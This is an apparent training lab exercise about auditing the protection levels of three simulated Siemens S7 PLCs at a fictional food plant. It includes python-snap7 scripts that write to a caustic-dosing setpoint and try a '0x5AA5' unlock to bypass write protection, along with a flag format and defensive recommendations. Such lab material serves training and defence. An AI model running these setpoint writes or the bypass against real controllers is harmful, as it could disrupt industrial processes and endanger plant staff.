    Exercise ICSPT-4.6: S7 Protection Audit

    Engagement Status

    Client Masa Foods, Inc. (fictional)
    Role OT Security Engineer, Plant 2
    Phase Discovery Enumeration Analysis (multi-PLC audit) Reporting

    What you know so far: Exercise 4.5 gave you the legacy unlock magic and taught you how to distinguish between protection level 1 (free writes) and protection level 2 (silently dropped writes with a bypass). Exercise 4.6 takes that skill to the whole Plant 2 fleet. Three Plant 2 controllers are running on unknown protection levels. Your job is to classify all three and submit the audit fingerprint as the flag.

    Environment Checklist

    Exercise 4.6 reaches three Plant 2 controllers instead of one. Add their hostnames to /etc/hosts before you start:

    Scenario

    Masa Foods Plant 2 runs three Siemens S7-1214C controllers. Commissioning records were lost in the 2024 SharePoint migration and nobody is certain which controllers are hardened and which are still shipping from the vendor default. Reyna Alvarado wants a documented audit that states the protection level of each PLC so the next firmware maintenance window can prioritize the unhardened units first.

    You have S7comm network access to all three PLCs:

    • plc-water-a.masa.local (PLC A)
    • plc-water-b.masa.local (PLC B)
    • plc-water-c.masa.local (PLC C)

    Why this matters

    Exercise 4.6 is the bread and butter of an OT security engineer's job on a brownfield fleet. Every real plant has lost commissioning documentation at some point, every real plant has PLCs commissioned by different engineers on different days with different protection choices, and every real plant's risk register contains at least one line that says "unknown protection level, assumed level 1 pending audit". The audit is the job, and there is no shortcut past it.

    The professional habit Exercise 4.6 builds is writing a single probe script once, parameterizing it on the target IP, and running it against every PLC on the network. Reyna uses the same technique when she walks new Plant 2 acquisitions. You are building the muscle to repeat the audit for the next 50 PLCs Masa acquires.

    The audit decision tree

    Observation Conclusion
    Test write persists immediately Level 1 (no protection)
    Test write reverts, then persists after 0x5AA5 unlock Level 2 (write-protected, legacy unlock accepted)
    Test write reverts even after 0x5AA5 unlock Level 4 (full lock)

    Your job is to run the probe against all three PLCs and assemble the audit fingerprint in this format:

    OCR{s7_audit_a<lvl>_b<lvl>_c<lvl>}

    Where each <lvl> is 1, 2, or 4. For example, substituting the level you read for each PLC into its slot gives OCR{s7_audit_a<lvlA>_b<lvlB>_c<lvlC>}.

    Background: Why Level 4 Also Rejects the Unlock Magic

    Exercise 4.5 showed you that writing 0x5AA5 to DB500 offset 0 bypasses protection level 2 on the simulator PLC. Level 4 is different. Siemens protection level 4 is a full lock: the firmware does not inspect DB500 at all when the current protection level is 4, because DB500 is itself inside the protected memory space. From the attacker's point of view, a level 4 PLC looks identical to a level 2 PLC that already has the unlock magic installed and a bug in the service code check. The only way to distinguish them is to write a test setpoint after the unlock attempt. If the write persists, it was level 2. If the write still reverts, it was level 4.

    There is no known wire-level bypass for Siemens protection level 4 on current firmware. Brownfield PLCs running a 2018-vintage baseline may have other disclosed bugs, but 0x5AA5 is not one of them against level 4.

    Walkthrough

    Stage 1: Probe a Single PLC by Hand

    Before writing any automation, walk the decision tree from the background section against one PLC manually. PLC A is a good starting point. The sequence you need is the same three-step test you used in Exercise 4.5:

    1. Read the current caustic setpoint from DB1 offset 16 (your "before" value)
    2. Write a safe test value (60 ml/min) and read it back
    3. If the write reverted, attempt the 0x5AA5 unlock and try the write again

    Kali

    python3 - <<'PYEOF'
import struct, time
from snap7.client import Client
c = Client()
c.connect("plc-water-a.masa.local", 0, 1, tcpport=102)

before = struct.unpack(">H", bytes(c.db_read(1, 16, 2)))[0]
print(f"baseline: {before} ml/min")

c.db_write(1, 16, struct.pack(">H", 60))
time.sleep(2)
after = struct.unpack(">H", bytes(c.db_read(1, 16, 2)))[0]
print(f"after write: {after} ml/min")

if after == 60:
    print("=> write persisted, this is level 1")
    c.db_write(1, 16, struct.pack(">H", 45))
else:
    print("=> write reverted, trying 0x5AA5 unlock")
    c.db_write(500, 0, struct.pack(">H", 0x5AA5))
    time.sleep(2)
    c.db_write(1, 16, struct.pack(">H", 60))
    time.sleep(2)
    after2 = struct.unpack(">H", bytes(c.db_read(1, 16, 2)))[0]
    print(f"after unlock + write: {after2} ml/min")
    if after2 == 60:
        print("=> unlock worked, this is level 2")
    else:
        print("=> unlock had no effect, this is level 4")
    c.db_write(1, 16, struct.pack(">H", 45))

c.disconnect()
c.destroy()
PYEOF

    Run the same block against PLC B and PLC C by changing the hostname. Notice that the logic is identical each time, only the target changes. That repetition is the signal that the code should become a function.

    Stage 2: Parameterize into a Reusable Script

    Extract the probe logic into a function that takes a hostname and returns the protection level as a string. Save this as audit.py:

    Kali: audit.py

    import struct, sys, time
from snap7.client import Client

def probe(host):
    """Run the three-step decision tree against one PLC.
    Returns '1', '2', or '4'."""
    c = Client()
    c.connect(host, 0, 1, tcpport=102)

    # Step 1: write a safe test value and read it back
    c.db_write(1, 16, struct.pack(">H", 60))
    time.sleep(2)
    after1 = struct.unpack(">H", bytes(c.db_read(1, 16, 2)))[0]
    if after1 == 60:
        c.db_write(1, 16, struct.pack(">H", 45))
        c.disconnect(); c.destroy()
        return "1"

    # Step 2: write reverted, so try the legacy unlock
    c.db_write(500, 0, struct.pack(">H", 0x5AA5))
    time.sleep(2)

    # Step 3: retry the same write after unlock
    c.db_write(1, 16, struct.pack(">H", 60))
    time.sleep(2)
    after2 = struct.unpack(">H", bytes(c.db_read(1, 16, 2)))[0]
    c.db_write(1, 16, struct.pack(">H", 45))
    c.disconnect(); c.destroy()

    if after2 == 60:
        return "2"
    return "4"

for host in sys.argv[1:]:
    print(f"{host}: level {probe(host)}")

    The function follows the exact same decision tree you ran by hand in Stage 1. Step 1 distinguishes level 1 from everything else. Steps 2 and 3 distinguish level 2 from level 4. The sys.argv loop at the bottom lets you pass all three hostnames on one command line.

    Stage 3: Run Against All Three PLCs

    Kali

    python3 audit.py plc-water-a.masa.local plc-water-b.masa.local plc-water-c.masa.local
    Expected output 
    plc-water-a.masa.local: level 1
plc-water-b.masa.local: level 2
plc-water-c.masa.local: level 4

    The exact mapping depends on how the simulator container was spawned. Do not memorize the mapping; trust the probe output.

    Stage 3: Assemble the Audit Fingerprint

    From the example output, read each PLC's level and substitute it into the template, producing OCR{s7_audit_a<lvlA>_b<lvlB>_c<lvlC>}. The actual values depend on the levels your probe reports, so derive them from your own audit rather than copying any worked example.

    Stage 4: Engagement Log

    Record the audit in your engagement log as a professional habit. The format Reyna expects is:

    PLC Hostname Protection Level Firmware Baseline Recommendation
    A plc-water-a.masa.local from probe from DB100 from decision tree
    B plc-water-b.masa.local from probe from DB100
    C plc-water-c.masa.local from probe from DB100

    The firmware baseline comes from reading DB100 offset 0-64 on each PLC (the same device identification read you practiced in Exercise 4.1). In this simulator all three report the same S7-1214C order code, but a real audit would catch mixed hardware.

    Output Interpretation

    • A level 1 PLC is the worst result because it means the PLC has no protection at all and any attacker on the OT LAN can write to DB1 unimpeded
    • A level 2 PLC that yields to the 0x5AA5 bypass is nearly as bad because the bypass is public and has been on every S7 pentest cheatsheet since 2018
    • A level 4 PLC is the only acceptable audit result for a production Plant 2 unit. Anything else goes on the risk register with a remediation deadline
    • A probe that hangs on connect() means the target is not reachable at all. Check TCP/102 and name resolution before assuming the PLC is level 4 by default

    Analysis Questions

    1. Why is the parameterized probe script the right primitive, even though you only run it three times in this exercise?

    Reveal answer

    Real audit jobs scale to 20 or 200 PLCs. Writing a parameterized script once and running it against a list is orders of magnitude faster than three copy-paste Python blocks, and it also leaves behind an artifact you can check into version control, share with the team, and re-run next quarter. The professional habit is to never write a single-shot audit. Always parameterize.

    2. Your probe writes 60 ml/min to DB1 offset 16 and restores it to 45. Is that ever unsafe?

    Reveal answer

    In this simulator, no. 60 ml/min is well below the 120 ml/min SIS trip threshold and the PLC will dose at 60 for about 2 seconds before you restore it. In a real plant the answer depends on the plant's safety envelope and whether 60 ml/min is inside the authorized operating band for the current batch. For a real audit, always confirm the safe probe value with the plant engineer before writing. The safe default is to read only and declare level 1 and level 2 indistinguishable, which is worse than nothing.

    3. If PLC A and PLC B are physically identical but report different protection levels, what does that tell you about Plant 2's commissioning discipline?

    Reveal answer

    It tells you that commissioning was done by at least two different engineers, or the same engineer on two different days with two different project templates. Neither is unusual in brownfield plants. The audit finding is not "someone messed up"; it is "the commissioning process is not standardized and should be". The fix is a commissioning checklist that enforces a single protection level as the default and flags exceptions explicitly.

    4. Would a Modbus-aware IDS catch the audit probe?

    Reveal answer

    No, for two reasons. First, a Modbus IDS does not inspect S7comm packets, so it cannot see DB1 writes at all. Second, even an S7-aware IDS tuned to catch malicious writes would see this probe as three normal DB writes from a single source and might or might not fire depending on the source IP reputation. The point is that audit activity and attack activity look identical at the protocol layer, which is why audit work should always be coordinated with the SOC and logged in the change control system before you start.

    Defensive Recommendations to Masa

    Finding Risk Mitigation
    Plant 2 PLCs commissioned at inconsistent protection levels High Create a Plant 2 commissioning checklist that forces protection level 3 or 4 as the default, with exceptions documented and approved
    No central audit artifact showing protection level per PLC High Run the Exercise 4.6 probe script quarterly and store the output in the engineering SharePoint
    Audit activity is indistinguishable from attack activity at the protocol layer Medium Require any audit to be paired with a change control ticket and a SOC notification before the probe runs
    2018-vintage firmware running on at least one Plant 2 controller Critical Upgrade every Plant 2 controller to current baseline during the next maintenance window

    Key Takeaways

    • Write the parameterized audit probe once and use it forever. The script is the artifact, not the output
    • Level 4 is the only acceptable steady state for a production Plant 2 controller. Levels 1 and 2 both go on the risk register
    • Audit and attack look identical on the wire. Coordinate every audit with the SOC and change control in advance
    • Brownfield commissioning is always inconsistent. Plan for the inconsistency instead of pretending it does not exist
